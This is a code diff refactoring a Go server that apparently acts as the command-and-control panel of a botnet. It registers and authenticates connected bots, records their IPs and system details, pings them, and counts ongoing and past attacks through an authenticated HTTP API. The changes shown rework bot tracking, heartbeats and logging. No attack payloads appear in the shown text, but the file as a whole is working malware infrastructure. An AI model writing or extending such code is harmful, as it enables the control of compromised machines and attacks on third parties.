@@ -1,7 +1,6 @@
 package main
 
 import (
-	"context"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/binary"
@@ -17,12 +16,11 @@ import (
 	"time"
 )
 
-// Connection Pool Types and Functions
 type ConnectionPool struct {
 	pool        map[string]*PooledConn
 	mutex       sync.RWMutex
 	maxSize     int
-	currentSize int32 // Atomic counter
+	currentSize int32
 }
 
 type PooledConn struct {
@@ -30,7 +28,6 @@ type PooledConn struct {
 	lastUsed time.Time
 }
 
-// API Server Types
 type APIServer struct {
 	port    string
 	server  *http.Server
@@ -58,6 +55,8 @@ type BotInfo struct {
 	IP         string     `json:"ip"`
 	Connected  time.Time  `json:"connected"`
 	LastPing   time.Time  `json:"last_ping"`
+	Status     string     `json:"status"`
+	PingMs     int64      `json:"ping_ms"`
 	SystemInfo SystemInfo `json:"system_info,omitempty"`
 }
 
@@ -67,6 +66,10 @@ type SystemInfo struct {
 	CPU    string `json:"cpu,omitempty"`
 	RAM    string `json:"ram,omitempty"`
 	Uptime string `json:"uptime,omitempty"`
+	Load1  string `json:"load_1,omitempty"`
+	Load5  string `json:"load_5,omitempty"`
+	Load15 string `json:"load_15,omitempty"`
+	Disk   string `json:"disk_usage,omitempty"`
 }
 
 type StatsResponse struct {
@@ -78,19 +81,23 @@ type StatsResponse struct {
 }
 
 var (
-	botInfoMapMutex        sync.RWMutex
-	ongoingAttacksMutex    sync.RWMutex
-	ongoingAPIAttacksMutex sync.RWMutex
-	attackHistoryMutex     sync.RWMutex
-	clientsMutex           sync.RWMutex
+	ongoingAttacksMutex sync.RWMutex
+	// ongoingAPIAttacksMutex sync.RWMutex
+	attackHistoryMutex sync.RWMutex
+	clientsMutex       sync.RWMutex
+	botPingTrackerMu   sync.Mutex
+	botPingTracker     = make(map[string]time.Time)
 )
+
+type AuthPacket struct {
+	BotID string `json:"bot_id"`
+}
 
 const (
 	MaxBotInfoEntries = 50000
 	MaxAPIAttacks     = 1000
 )
 
-// Protocol Constants and Types
 const (
 	PacketTypePing         = 0x01
 	PacketTypePong         = 0x02
@@ -113,7 +120,6 @@ type Packet struct {
 	Payload []byte
 }
 
-// Global variables
 var (
 	apiServer       *APIServer
 	botInfoMap      = make(map[string]BotInfo)
@@ -130,7 +136,6 @@ func init() {
 	serverStartTime = time.Now()
 }
 
-// Connection Pool Functions
 func NewConnectionPool(maxSize int) *ConnectionPool {
 	return &ConnectionPool{
 		pool:        make(map[string]*PooledConn),
@@ -155,7 +160,6 @@ func (p *ConnectionPool) Get(addr string) (*tls.Conn, bool) {
 	defer p.mutex.RUnlock()
 
 	if pooled, exists := p.pool[addr]; exists {
-		// Check if connection is still alive
 		if pooled.conn != nil {
 			pooled.lastUsed = time.Now()
 			return pooled.conn, true
@@ -172,8 +176,8 @@ func (p *ConnectionPool) Put(addr string, conn *tls.Conn) error {
 		return fmt.Errorf("connection pool full")
 	}
 
-	if _, exists := p.pool[addr]; exists {
-		return fmt.Errorf("connection already exists")
+	if existing, exists := p.pool[addr]; exists {
+		existing.conn.Close()
 	}
 
 	p.pool[addr] = &PooledConn{
@@ -216,7 +220,6 @@ func (p *ConnectionPool) CloseAll() {
 	p.pool = make(map[string]*PooledConn)
 }
 
-// API Server Functions
 func NewAPIServer(port string) *APIServer {
 	return &APIServer{
 		port: port,
@@ -365,16 +368,9 @@ func (s *APIServer) botsHandler(w http.ResponseWriter, r *http.Request) {
 		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
 		return
 	}
-	botInfoLock.RLock()
-	bots := make([]BotInfo, 0, len(botInfoMap))
-	for _, bot := range botInfoMap {
-		bots = append(bots, bot)
-	}
-	botInfoLock.RUnlock()
-	s.sendResponse(w, APIResponse{
-		Success: true,
-		Data:    bots,
-	}, http.StatusOK)
+
+	botList := GetActiveBotInfos()
+	s.sendResponse(w, APIResponse{Success: true, Data: botList}, http.StatusOK)
 }
 
 func (s *APIServer) statsHandler(w http.ResponseWriter, r *http.Request) {
@@ -394,35 +390,28 @@ func (s *APIServer) statsHandler(w http.ResponseWriter, r *http.Request) {
 		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
 		return
 	}
-	activeBots := 0
-	botInfoLock.RLock()
-	for _, bot := range botInfoMap {
-		if time.Since(bot.LastPing) < time.Minute*5 {
-			activeBots++
-		}
-	}
-	botInfoLock.RUnlock()
+
+	botSummary := heartbeatManager.GetBotStatusSummary()
+	ongoingAPIAttacksMutex.RLock()
+	activeAPIAttacks := len(ongoingAPIAttacks)
+	ongoingAPIAttacksMutex.RUnlock()
+
 	attackLock.Lock()
-	activeAttacks := 0
-	for _, attack := range ongoingAttacks {
-		if time.Now().Before(attack.start.Add(attack.duration)) {
-			activeAttacks++
-		}
-	}
+	activeStandardAttacks := len(ongoingAttacks)
 	attackLock.Unlock()
-	apiAttackLock.Lock()
-	for _, a := range ongoingAPIAttacks {
-		if time.Now().Before(a.start.Add(a.duration)) {
-			activeAttacks++
-		}
-	}
-	apiAttackLock.Unlock()
+
+	historyLock.Lock()
+	totalAttacks := len(attackHistory)
+	historyLock.Unlock()
+
+	uptime := time.Since(serverStartTime)
+
 	stats := StatsResponse{
-		TotalBots:     len(botInfoMap),
-		ActiveBots:    activeBots,
-		TotalAttacks:  len(attackHistory),
-		ActiveAttacks: activeAttacks,
-		Uptime:        time.Since(serverStartTime).Truncate(time.Second).String(),
+		TotalBots:     botSummary["TOTAL"],
+		ActiveBots:    botSummary["ONLINE"] + botSummary["LAGGING"],
+		TotalAttacks:  totalAttacks,
+		ActiveAttacks: activeStandardAttacks + activeAPIAttacks,
+		Uptime:        uptime.Truncate(time.Second).String(),
 	}
 	s.sendResponse(w, APIResponse{
 		Success: true,
@@ -430,15 +419,12 @@ func (s *APIServer) statsHandler(w http.ResponseWriter, r *http.Request) {
 	}, http.StatusOK)
 }
 
-// Use in API authentication:
 func (s *APIServer) authenticate(token, secret, username string) bool {
-	// Use secret manager for additional validation
 	storedSecret, exists := secretManager.GetSecret(username + "_api_secret")
 	if exists && SecureCompare(storedSecret, secret) {
 		return true
 	}
 
-	// Fallback to existing user file validation
 	users, err := loadUsers()
 	if err != nil {
 		return false
@@ -479,39 +465,123 @@ func (s *APIServer) sendError(w http.ResponseWriter, message string, statusCode 
 	}, statusCode)
 }
 
-// Bot Info Management Functions
-func UpdateBotInfo(conn net.Conn, info SystemInfo) {
-	botID := conn.RemoteAddr().String()
-	botInfo := BotInfo{
-		ID:         botID,
-		IP:         conn.RemoteAddr().(*net.TCPAddr).IP.String(),
-		Connected:  time.Now(),
-		LastPing:   time.Now(),
-		SystemInfo: info,
-	}
+func UpdateBotInfo(botID string, remoteAddr net.Addr, info SystemInfo) {
 	botInfoLock.Lock()
-	botInfoMap[botID] = botInfo
-	botInfoLock.Unlock()
+	defer botInfoLock.Unlock()
+
+	existing, exists := botInfoMap[botID]
+	if !exists {
+		existing = BotInfo{
+			ID:        botID,
+			Connected: time.Now(),
+		}
+	}
+
+	if existing.Connected.IsZero() {
+		existing.Connected = time.Now()
+	}
+
+	if tcpAddr, ok := remoteAddr.(*net.TCPAddr); ok && tcpAddr.IP != nil {
+		existing.IP = tcpAddr.IP.String()
+	}
+
+	existing.LastPing = time.Now()
+	existing.Status = "ONLINE"
+	existing.SystemInfo = info
+
+	botInfoMap[botID] = existing
 }
 
-func UpdateBotPing(conn net.Conn) {
-	botID := conn.RemoteAddr().String()
+func UpdateBotPing(botID string, ping time.Duration) {
 	botInfoLock.Lock()
+	defer botInfoLock.Unlock()
+
 	if bot, exists := botInfoMap[botID]; exists {
 		bot.LastPing = time.Now()
+		if ping >= 0 {
+			bot.PingMs = ping.Milliseconds()
+		}
+		bot.Status = "ONLINE"
 		botInfoMap[botID] = bot
+		return
 	}
-	botInfoLock.Unlock()
+
+	pingMs := int64(0)
+	if ping >= 0 {
+		pingMs = ping.Milliseconds()
+	}
+
+	botInfoMap[botID] = BotInfo{
+		ID:        botID,
+		Connected: time.Now(),
+		LastPing:  time.Now(),
+		Status:    "ONLINE",
+		PingMs:    pingMs,
+	}
 }
 
-func RemoveBotInfo(conn net.Conn) {
-	botID := conn.RemoteAddr().String()
+func RemoveBotInfo(botID string) {
 	botInfoLock.Lock()
 	delete(botInfoMap, botID)
 	botInfoLock.Unlock()
 }
 
-// Protocol Functions
+func RecordBotConnection(botID string, addr net.Addr) {
+	botInfoLock.Lock()
+	defer botInfoLock.Unlock()
+
+	entry, exists := botInfoMap[botID]
+	if !exists {
+		entry = BotInfo{ID: botID, Connected: time.Now()}
+	}
+
+	if entry.Connected.IsZero() {
+		entry.Connected = time.Now()
+	}
+
+	if tcpAddr, ok := addr.(*net.TCPAddr); ok && tcpAddr.IP != nil {
+		entry.IP = tcpAddr.IP.String()
+	}
+
+	entry.LastPing = time.Now()
+	entry.Status = "ONLINE"
+	botInfoMap[botID] = entry
+}
+
+func GetActiveBotInfos() []BotInfo {
+	botInfoLock.RLock()
+	snapshot := make(map[string]BotInfo, len(botInfoMap))
+	for id, info := range botInfoMap {
+		snapshot[id] = info
+	}
+	botInfoLock.RUnlock()
+
+	heartbeatSnapshot := heartbeatManager.GetDetailedBotStatus()
+	now := time.Now()
+	bots := make([]BotInfo, 0, len(snapshot))
+
+	for id, info := range snapshot {
+		if detail, exists := heartbeatSnapshot[id]; exists {
+			if !detail.Live {
+				continue
+			}
+			info.Status = detail.Status
+			info.LastPing = detail.LastHeartbeat
+			info.PingMs = detail.PingMS
+			bots = append(bots, info)
+			continue
+		}
+
+		if now.Sub(info.LastPing) > offlineThreshold {
+			continue
+		}
+
+		bots = append(bots, info)
+	}
+
+	return bots
+}
+
 func CalculateChecksum(data []byte) uint16 {
 	hash := sha256.Sum256(data)
 	return binary.BigEndian.Uint16(hash[:2])
@@ -624,128 +694,131 @@ func validateCommand(method string) bool {
 	return validCommands[method]
 }
 
-// Enhanced handleBotConnection with proper authentication
 func handleBotConnection(conn *tls.Conn) {
-	addr := conn.RemoteAddr().String()
-	connectionPool.Put(addr, conn)
-	defer connectionPool.Remove(addr)
-
-	// Use context for graceful shutdown
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
-	// Set initial deadline for authentication
-	conn.SetDeadline(time.Now().Add(30 * time.Second))
-
-	// Handle authentication first
-	authPacket, err := ReceivePacket(conn)
+	defer conn.Close()
+	botID, err := parseBotAuth(conn)
 	if err != nil {
-		fmt.Printf("Error receiving auth packet from bot %s: %v\n", addr, err)
-		conn.Close()
+		LogBotConnection(conn.RemoteAddr().String(), false)
+		LogSystem("warn", "Bot authentication failed", map[string]interface{}{"ip": conn.RemoteAddr().String(), "error": err.Error()})
 		return
 	}
 
-	if authPacket.Header.Type != PacketTypeAuth {
-		fmt.Printf("Expected auth packet from bot %s, got type %d\n", addr, authPacket.Header.Type)
-		conn.Close()
-		return
-	}
+	botManager.AddBot(botID, conn)
+	RecordBotConnection(botID, conn.RemoteAddr())
+	defer func() {
+		botManager.RemoveBot(botID)
+		heartbeatManager.RemoveBot(botID)
+		RemoveBotInfo(botID)
+		LogBotConnection(conn.RemoteAddr().String(), false)
+		LogSystem("info", "Bot disconnected and cleaned up", map[string]interface{}{"botID": botID})
+	}()
 
-	// Send authentication response
-	authResponse := CreatePacket(PacketTypeAuthResponse, []byte("authenticated"))
-	if err := SendPacket(conn, authResponse); err != nil {
-		fmt.Printf("Error sending auth response to bot %s: %v\n", addr, err)
-		conn.Close()
-		return
-	}
+	LogBotConnection(conn.RemoteAddr().String(), true)
+	LogSystem("info", "Bot authenticated successfully", map[string]interface{}{"botID": botID, "ip": conn.RemoteAddr().String()})
+	heartbeatManager.UpdateBot(botID, time.Now(), 0) // Initial heartbeat
 
-	fmt.Printf("Bot %s authenticated successfully\n", addr)
+	stopHeartbeat := make(chan struct{})
+	go monitorBotHeartbeat(conn, botID, stopHeartbeat)
+	defer close(stopHeartbeat)
 
-	// Reset deadline after successful authentication
-	conn.SetDeadline(time.Time{})
-
-	// Initialize rate limiter with context
-	rateLimiter.WithContext(ctx)
-
-	stopPing := make(chan struct{})
-	defer close(stopPing)
-	defer removeBotConn(conn)
-
-	UpdateBotInfo(conn, SystemInfo{})
-
-	// Start heartbeat monitoring using the new system
-	go monitorBotHeartbeat(conn, stopPing)
-
-	// Request diagnostics on connection
+	// Request diagnostics
 	if err := RequestDiagnostics(conn); err != nil {
-		fmt.Printf("Error requesting diagnostics from bot %s: %v\n", addr, err)
+		// It's not fatal, just log it
+		LogSystem("info", "Failed to request diagnostics from bot", map[string]interface{}{"botID": botID, "error": err.Error()})
 	}
 
 	// Main packet handling loop
 	for {
 		packet, err := ReceivePacket(conn)
 		if err != nil {
-			if err == io.EOF {
-				fmt.Printf("Bot %s disconnected\n", addr)
-			} else {
-				fmt.Printf("Error receiving packet from bot %s: %v\n", addr, err)
-			}
-			break
+			// Bot disconnected, the deferred cleanup will handle removal.
+			LogSystem("info", "Bot receive packet error, disconnecting", map[string]interface{}{"botID": botID, "error": err.Error()})
+			return
 		}
-
-		switch packet.Header.Type {
-		case PacketTypePing:
-			UpdateBotPing(conn)
-			// Also update heartbeat manager
-			pingTime := time.Since(time.Unix(0, packet.Header.Timestamp))
-			heartbeatManager.UpdateBotHeartbeat(addr, pingTime)
-
-		case PacketTypeDiagnostic:
-			HandleDiagnosticResponse(conn, packet)
-
-		case PacketTypeHeartbeat:
-			HandleBotHeartbeat(conn, packet)
-
-		case PacketTypeAuth:
-			// Handle re-authentication if needed
-			fmt.Printf("Re-auth request from bot %s\n", addr)
-			authResponse := CreatePacket(PacketTypeAuthResponse, []byte("re-authenticated"))
-			if err := SendPacket(conn, authResponse); err != nil {
-				fmt.Printf("Error sending re-auth response: %v\n", err)
-			}
-
-		default:
-			fmt.Printf("Unknown packet type %d from bot %s\n", packet.Header.Type, addr)
+		if err := handleAuthenticatedBotPacket(conn, packet, botID); err != nil {
+			LogSystem("warn", "Error handling authenticated packet", map[string]interface{}{"botID": botID, "error": err.Error()})
+			// Depending on the error, we might want to disconnect the bot.
+			// For now, we'll just log it.
 		}
 	}
-
-	RemoveBotInfo(conn)
-	heartbeatManager.RemoveBot(addr)
 }
 
-func monitorBotHeartbeat(conn net.Conn, stop <-chan struct{}) {
+func parseBotAuth(conn net.Conn) (string, error) {
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	defer conn.SetReadDeadline(time.Time{})
+
+	packet, err := ReceivePacket(conn)
+	if err != nil {
+		return "", fmt.Errorf("failed to receive auth packet: %w", err)
+	}
+
+	if packet.Header.Type != PacketTypeAuth {
+		return "", fmt.Errorf("expected auth packet type %d, but got %d", PacketTypeAuth, packet.Header.Type)
+	}
+
+	// For now, bot ID is in payload. This can be improved.
+	botID := string(packet.Payload)
+	if botID == "" {
+		return "", errors.New("authentication failed: bot ID is empty")
+	}
+
+	// Send auth response
+	authRespPacket := CreatePacket(PacketTypeAuthResponse, []byte("OK"))
+	if err := SendPacket(conn, authRespPacket); err != nil {
+		return "", fmt.Errorf("failed to send auth response to bot %s: %w", botID, err)
+	}
+
+	return botID, nil
+}
+
+func handleAuthenticatedBotPacket(conn net.Conn, packet Packet, botID string) error {
+	switch packet.Header.Type {
+	case PacketTypePong:
+		// If the botID is empty, attempt to lookup by connection
+		if botID == "" {
+			botID = botManager.GetBotIDByConn(conn)
+		}
+		var pingDuration time.Duration = -1
+		botPingTrackerMu.Lock()
+		if start, exists := botPingTracker[botID]; exists {
+			pingDuration = time.Since(start)
+			delete(botPingTracker, botID)
+		}
+		botPingTrackerMu.Unlock()
+		// Inferred from ping response
+		heartbeatManager.UpdateBot(botID, time.Now(), pingDuration)
+		UpdateBotPing(botID, pingDuration)
+	case PacketTypeDiagnostic:
+		HandleDiagnosticResponse(botID, conn, packet)
+	case PacketTypeHeartbeat:
+		// This could be a proactive heartbeat from the bot
+		if botID == "" {
+			botID = botManager.GetBotIDByConn(conn)
+		}
+		heartbeatManager.UpdateBot(botID, time.Now(), 0)
+		UpdateBotPing(botID, -1)
+	default:
+		// Handle other packet types if necessary
+	}
+	return nil
+}
+
+func monitorBotHeartbeat(conn net.Conn, botID string, stop <-chan struct{}) {
 	ticker := time.NewTicker(30 * time.Second)
 	defer ticker.Stop()
 
 	for {
 		select {
 		case <-ticker.C:
-			heartbeat := CreatePacket(PacketTypeHeartbeat, []byte{})
-			if err := SendPacket(conn, heartbeat); err != nil {
-				fmt.Printf("Error sending heartbeat to bot %s: %v\n", conn.RemoteAddr(), err)
+			pingPacket := CreatePacket(PacketTypePing, nil)
+			start := time.Now()
+			if err := SendPacket(conn, pingPacket); err != nil {
+				// Bot is likely disconnected
 				return
 			}
-
-			botInfoLock.RLock()
-			bot, exists := botInfoMap[conn.RemoteAddr().String()]
-			botInfoLock.RUnlock()
-
-			if exists && time.Since(bot.LastPing) > 2*time.Minute {
-				fmt.Printf("Bot %s is unresponsive, last ping: %v\n", conn.RemoteAddr(), bot.LastPing)
-				conn.Close()
-				return
-			}
-
+			botPingTrackerMu.Lock()
+			botPingTracker[botID] = start
+			botPingTrackerMu.Unlock()
 		case <-stop:
 			return
 		}
